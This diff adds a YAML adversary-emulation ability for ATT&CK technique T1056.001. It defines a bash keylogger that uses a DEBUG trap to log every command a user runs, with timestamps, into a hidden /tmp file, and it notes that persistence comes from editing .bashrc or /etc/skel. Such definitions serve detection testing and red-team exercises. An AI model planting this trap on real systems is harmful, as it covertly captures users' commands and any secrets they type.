@@ -1,0 +1,22 @@
+---
+- id: 7fc9f469a239523a47355677e712a887
+  name: Bash session based keylogger
+  description: "When a command is executed in bash, the BASH_COMMAND variable contains\
+    \ that command. For example :~$ echo $BASH_COMMAND = \"echo $BASH_COMMAND\". The\
+    \ trap command is not a external command, but a built-in function of bash and\
+    \ can be used in a script to run a bash function when some event occurs. trap\
+    \ will detect when the BASH_COMMAND variable value changes and then pipe that\
+    \ value into a file, creating a bash session based keylogger. \n\nTo gain persistence\
+    \ the command could be added to the users .bashrc or .bash_aliases or the systems\
+    \ default .bashrc in /etc/skel/ \n"
+  tactic: multiple
+  technique:
+    attack_id: T1056.001
+    name: 'Input Capture: Keylogging'
+  platforms:
+    linux:
+      sh:
+        command: trap 'echo "$(date +"%d/%m/%y %H:%M:%S.%s") $USER $BASH_COMMAND"
+          >> /tmp/.keyboard.log' DEBUG; echo "Hello World!"; cat /tmp/.keyboard.log
+        payloads: []
+        cleanup: rm /tmp/.keyboard.log
